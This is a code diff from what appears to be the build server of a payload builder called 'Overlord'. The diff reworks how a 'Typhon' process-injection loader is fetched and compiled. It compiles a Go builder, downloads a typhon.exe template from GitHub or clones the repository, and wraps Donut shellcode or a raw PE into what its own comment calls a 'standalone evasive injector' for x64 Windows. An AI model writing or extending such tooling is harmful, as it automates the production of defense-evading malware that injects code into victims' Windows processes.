@@ -132,79 +132,99 @@ async function isWineAvailable(): Promise<boolean> {
 
 async function checkTyphonAvailable(sendToStream: (data: any) => void): Promise<TyphonInfo | null> {
   const toolsDir = path.join(ensureDataDir(), "tools");
+  fs.mkdirSync(toolsDir, { recursive: true });
 
-  // Helper: resolve a found binary, checking Wine requirement on Linux
-  const resolve = async (binPath: string, label: string): Promise<TyphonInfo | null> => {
-    if (process.platform !== "linux") {
-      sendToStream({ type: "output", text: `Typhon found: ${label}\n`, level: "info" });
-      return { bin: binPath, useWine: false };
-    }
-    if (isPEFile(binPath)) {
-      if (await isWineAvailable()) {
-        sendToStream({ type: "output", text: `Typhon found: ${label} (via Wine)\n`, level: "info" });
-        return { bin: binPath, useWine: true };
-      }
-      sendToStream({ type: "output", text: `WARNING: ${label} is a Windows PE but Wine is not installed\n`, level: "warn" });
+  const nativeBuilder = path.join(toolsDir, "typhon-builder");
+  const template = path.join(toolsDir, "typhon.exe");
+
+  // Step 1: ensure native typhon-builder binary exists (compile from Go source if needed)
+  if (!fs.existsSync(nativeBuilder)) {
+    const goSrc = path.join(resolveRuntimeRoot(), "src", "server", "typhon-builder.go");
+    if (!fs.existsSync(goSrc)) {
+      sendToStream({ type: "output", text: `WARNING: typhon-builder.go source not found at ${goSrc}\n`, level: "warn" });
       return null;
     }
-    sendToStream({ type: "output", text: `Typhon found: ${label}\n`, level: "info" });
-    return { bin: binPath, useWine: false };
-  };
-
-  // 1. TYPHON_BIN env var
-  const envBin = process.env.TYPHON_BIN?.trim();
-  if (envBin && fs.existsSync(envBin)) {
-    return resolve(envBin, `${envBin} (TYPHON_BIN)`);
-  }
-
-  // 2. Check system PATH (native binary)
-  try {
-    const which = await $`which typhon`.quiet().nothrow();
-    if (which.exitCode === 0 && which.stdout.toString().trim()) {
-      sendToStream({ type: "output", text: `Typhon found in PATH\n`, level: "info" });
-      return { bin: "typhon", useWine: false };
-    }
-  } catch {}
-
-  // 3. Check data/tools/
-  for (const name of ["typhon.exe", "typhon"]) {
-    const localPath = path.join(toolsDir, name);
-    if (fs.existsSync(localPath)) {
-      return resolve(localPath, localPath);
-    }
-  }
-
-  // 4. On Linux: clone repo and look for a pre-built binary
-  if (process.platform === "linux") {
-    fs.mkdirSync(toolsDir, { recursive: true });
-    const srcDir = path.join(toolsDir, "typhon-src");
-
-    if (!fs.existsSync(srcDir)) {
-      sendToStream({ type: "output", text: "Cloning messecv3/typhon-process-injection...\n", level: "info" });
-      const cloneResult = await $`git clone --depth 1 https://github.com/messecv3/typhon-process-injection.git ${srcDir}`.quiet().nothrow();
-      if (cloneResult.exitCode !== 0) {
-        const err = (cloneResult.stderr.toString() || cloneResult.stdout.toString()).trim();
-        sendToStream({ type: "output", text: `WARNING: Failed to clone Typhon: ${err}\n`, level: "warn" });
-        return null;
+    sendToStream({ type: "output", text: "Compiling native typhon-builder from Go source...\n", level: "info" });
+    try {
+      const tmpDir = fs.mkdtempSync("/tmp/typhon-build-");
+      try {
+        fs.copyFileSync(goSrc, path.join(tmpDir, "main.go"));
+        const initResult = await $`go mod init typhon-build`.cwd(tmpDir).nothrow().quiet();
+        if (initResult.exitCode !== 0) {
+          sendToStream({ type: "output", text: `WARNING: go mod init failed: ${initResult.stderr.toString().trim()}\n`, level: "warn" });
+          return null;
+        }
+        const buildResult = await $`go build -o ${nativeBuilder} .`.cwd(tmpDir).nothrow().quiet();
+        if (buildResult.exitCode !== 0) {
+          sendToStream({ type: "output", text: `WARNING: typhon-builder compile failed: ${buildResult.stderr.toString().trim()}\n`, level: "warn" });
+          return null;
+        }
+        fs.chmodSync(nativeBuilder, 0o755);
+        sendToStream({ type: "output", text: `Native typhon-builder compiled: ${nativeBuilder}\n`, level: "info" });
+      } finally {
+        fs.rmSync(tmpDir, { recursive: true, force: true });
       }
+    } catch (err: any) {
+      sendToStream({ type: "output", text: `WARNING: Failed to compile typhon-builder: ${err.message || err}\n`, level: "warn" });
+      return null;
     }
-
-    // Check for a pre-built binary inside the cloned repo
-    for (const name of ["typhon.exe", "typhon"]) {
-      const repoBin = path.join(srcDir, name);
-      if (fs.existsSync(repoBin)) {
-        const localBin = path.join(toolsDir, name);
-        fs.copyFileSync(repoBin, localBin);
-        fs.chmodSync(localBin, 0o755);
-        sendToStream({ type: "output", text: `Typhon binary found in repo\n`, level: "info" });
-        return resolve(localBin, `${localBin} (from repo)`);
-      }
-    }
-
-    sendToStream({ type: "output", text: `WARNING: Typhon repo cloned but no pre-built binary found. Place typhon.exe in ${toolsDir} or install Wine and provide a Windows build.\n`, level: "warn" });
+  } else {
+    sendToStream({ type: "output", text: `Native typhon-builder found: ${nativeBuilder}\n`, level: "info" });
   }
 
-  return null;
+  // Step 2: ensure typhon.exe template exists (needed by typhon-builder to embed shellcode)
+  if (!fs.existsSync(template)) {
+    sendToStream({ type: "output", text: "Fetching Typhon template (typhon.exe) from GitHub...\n", level: "info" });
+    try {
+      const apiResp = await fetch("https://api.github.com/repos/messecv3/typhon-process-injection/releases/latest", {
+        headers: { "User-Agent": "Overlord-Builder/1.0", "Accept": "application/vnd.github+json" },
+      });
+      if (apiResp.ok) {
+        const release = await apiResp.json() as any;
+        const asset = (release.assets as any[]).find((a: any) => /typhon.*\.exe$/i.test(a.name));
+        if (asset) {
+          const dlResp = await fetch(asset.browser_download_url, { headers: { "User-Agent": "Overlord-Builder/1.0" } });
+          if (dlResp.ok) {
+            fs.writeFileSync(template, Buffer.from(await dlResp.arrayBuffer()));
+            sendToStream({ type: "output", text: `Typhon template downloaded: ${template}\n`, level: "info" });
+          }
+        }
+      }
+    } catch {}
+
+    if (!fs.existsSync(template)) {
+      // Fall back: clone repo and grab the binary from there
+      try {
+        const tmpClone = fs.mkdtempSync("/tmp/typhon-clone-");
+        try {
+          const cloneResult = await $`git clone --depth 1 https://github.com/messecv3/typhon-process-injection.git ${tmpClone}`.nothrow().quiet();
+          if (cloneResult.exitCode === 0) {
+            const candidates = [
+              path.join(tmpClone, "typhon.exe"),
+              path.join(tmpClone, "bin", "typhon.exe"),
+              path.join(tmpClone, "release", "typhon.exe"),
+            ];
+            for (const c of candidates) {
+              if (fs.existsSync(c)) {
+                fs.copyFileSync(c, template);
+                sendToStream({ type: "output", text: `Typhon template copied from repo: ${template}\n`, level: "info" });
+                break;
+              }
+            }
+          }
+        } finally {
+          fs.rmSync(tmpClone, { recursive: true, force: true });
+        }
+      } catch {}
+    }
+  }
+
+  if (!fs.existsSync(template)) {
+    sendToStream({ type: "output", text: `WARNING: typhon.exe template not found. Place it at ${template} for Typhon to work.\n`, level: "warn" });
+    return null;
+  }
+
+  return { bin: nativeBuilder, useWine: false };
 }
 
 async function checkDonutAvailable(sendToStream: (data: any) => void): Promise<string | null> {
@@ -930,7 +950,7 @@ export async function startBuildProcess(
       if (!typhonInfo) {
         sendToStream({
           type: "output",
-          text: "ERROR: Typhon is not available. Place typhon.exe in the data/tools/ directory, set TYPHON_BIN, or install Wine to run a Windows build on Linux. See https://github.com/messecv3/typhon-process-injection\n",
+          text: "ERROR: Typhon is not available. Ensure Go is installed (for native typhon-builder compilation) and typhon.exe template is accessible. See https://github.com/messecv3/typhon-process-injection\n",
           level: "error",
         });
         throw new Error("Typhon not found");
@@ -1537,29 +1557,30 @@ func runBoundFiles() {
         }
 
         // Typhon process injection loader (wraps shellcode into a standalone evasive injector)
-        // Typhon supports x64 Windows only. It takes Donut shellcode (preferred) or a raw PE.
+        // Typhon supports x64 Windows only. Uses native typhon-builder (Linux Go binary).
         if (typhonInfo && os === "windows" && actualArch === "amd64") {
           const typhonInput = donutShellcodePath || filePath;
           const typhonOutputName = deps.sanitizeOutputName(outputName.replace(/\.[^/.]+$/, "") + "-typhon.exe");
           const typhonOutputPath = `${outDir}/${typhonOutputName}`;
+          const typhonTemplate = path.join(ensureDataDir(), "tools", "typhon.exe");
 
           sendToStream({ type: "output", text: `Building Typhon injector for ${platform}...\n`, level: "info" });
 
-          const typhonArgs: string[] = ["-build", typhonInput, "-o", typhonOutputPath];
+          // typhon-builder flags: -i <input> -o <output> [-variant X] [-template path] [-donut path]
+          const typhonArgs: string[] = [
+            "-i", typhonInput,
+            "-o", typhonOutputPath,
+            "-template", typhonTemplate,
+          ];
           if (config.typhonVariant) {
             typhonArgs.push("-variant", config.typhonVariant);
           }
-          if (config.typhonProcess) {
-            typhonArgs.push("-process", config.typhonProcess);
+          if (donutBin) {
+            typhonArgs.push("-donut", donutBin);
           }
 
           try {
-            let typhonResult;
-            if (typhonInfo.useWine) {
-              typhonResult = await $`wine ${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
-            } else {
-              typhonResult = await $`${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
-            }
+            const typhonResult = await $`${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
 
             if (typhonResult.exitCode !== 0) {
               const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
